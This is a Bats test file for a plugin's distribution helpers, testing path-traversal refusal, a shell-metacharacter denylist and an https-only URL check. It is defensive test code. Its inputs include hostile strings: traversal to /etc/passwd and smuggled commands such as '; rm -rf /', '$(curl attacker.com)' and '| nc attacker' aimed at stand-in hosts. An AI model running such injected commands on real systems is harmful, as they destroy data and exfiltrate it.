#!/usr/bin/env bats
# distribution-canonicalize.bats — E99-S3 (SR-79, SR-80, ADR-112, TC-DCH-9/10/11)
#
# Bats coverage for distribution.manifest path canonicalization + project-root
# containment + shell-metacharacter denylist + URL-shape validation.

load 'test_helper.bash'

setup() {
  common_setup
  PLUGIN_DIR="$( cd "$BATS_TEST_DIRNAME/.." && pwd )"
  CANON="$PLUGIN_DIR/scripts/lib/distribution-canonicalize.sh"
  PROJECT_ROOT="$TEST_TMP/project"
  mkdir -p "$PROJECT_ROOT"
}

teardown() { common_teardown; }

# ---------- Happy path: relative manifest inside project root canonicalizes ----------

@test "happy: relative manifest 'plugin.json' inside project canonicalizes to absolute" {
  printf '{}' > "$PROJECT_ROOT/plugin.json"
  run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' 'plugin.json'"
  [ "$status" -eq 0 ]
  # Output should be the absolute canonical path (Linux realpath / macOS readlink -f)
  [[ "$output" == *"$PROJECT_ROOT/plugin.json"* ]]
}

@test "happy: nested manifest 'src/manifest.json' canonicalizes" {
  mkdir -p "$PROJECT_ROOT/src"
  printf '{}' > "$PROJECT_ROOT/src/manifest.json"
  run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' 'src/manifest.json'"
  [ "$status" -eq 0 ]
  [[ "$output" == *"$PROJECT_ROOT/src/manifest.json"* ]]
}

# ---------- TC-DCH-9: path traversal refusal ----------

@test "'../../../etc/passwd' refused per + T" {
  run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' '../../../etc/passwd'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-79|T-DCH-1|outside project root|traversal'
}

@test "'foo/../../../etc/passwd' refused (deeper traversal)" {
  run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' 'foo/../../../etc/passwd'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-79|outside project root|traversal'
}

@test "absolute path outside project '/etc/passwd' refused" {
  run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' '/etc/passwd'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-79|absolute|traversal'
}

# ---------- TC-DCH-10: shell-metacharacter denylist ----------

@test "registry with ';' refused per denylist" {
  run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com; rm -rf /'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell.*metachar'
}

@test "registry with '\$' refused per denylist" {
  run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com\$(curl attacker.com)'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell'
}

@test "registry with backtick refused" {
  run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com\`whoami\`'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell'
}

@test "registry with '&&' refused" {
  run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com && rm'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell'
}

@test "registry with '|' refused" {
  run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com | nc attacker'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell'
}

@test "clean registry value passes" {
  run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://registry.npmjs.org'"
  [ "$status" -eq 0 ]
}

# ---------- TC-DCH-11: URL-shape validation ----------

@test "'not-a-url' refused per URL-shape" {
  run bash -c "source '$CANON' && gaia_distribution_validate_url 'not-a-url'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-80|URL.*shape|T-DCH-2'
}

@test "'http://insecure.com' refused (https only)" {
  run bash -c "source '$CANON' && gaia_distribution_validate_url 'http://insecure.com'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-80|https'
}

@test "'https://registry.npmjs.org' passes" {
  run bash -c "source '$CANON' && gaia_distribution_validate_url 'https://registry.npmjs.org'"
  [ "$status" -eq 0 ]
}

@test "'https://ghcr.io/myorg/myimage' passes (with path)" {
  run bash -c "source '$CANON' && gaia_distribution_validate_url 'https://ghcr.io/myorg/myimage'"
  [ "$status" -eq 0 ]
}

@test "registry validator catches shell-metachar even when URL-shape would also fail" {
  run bash -c "source '$CANON' && gaia_distribution_validate_url 'https://evil.com; rm'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'SR-80|shell'
}

# ---------- AC3: '..' segments refused pre-canonicalization ----------

@test "'..' segment in manifest refused pre-canonicalization with T- cite" {
  run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' 'foo/../plugin.json'"
  [ "$status" -ne 0 ]
  echo "$output" | grep -qE 'T-DCH-1|SR-79|traversal'
}

# ---------- Source-guard ----------

@test "source-guard: double-source is idempotent" {
  run bash -c "source '$CANON' && source '$CANON' && declare -F gaia_distribution_canonicalize_manifest >/dev/null && echo OK"
  [ "$status" -eq 0 ]
  [ "$output" = "OK" ]
}

# ---------- Usage ----------

@test "usage: gaia_distribution_canonicalize_manifest with missing args fails" {
  run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest"
  [ "$status" -ne 0 ]
}

@test "usage: gaia_distribution_validate_string with empty arg passes (empty is not a denylist hit)" {
  run bash -c "source '$CANON' && gaia_distribution_validate_string ''"
  # Empty string contains no metacharacters; should pass (caller decides
  # whether to enforce non-emptiness separately).
  [ "$status" -eq 0 ]
}
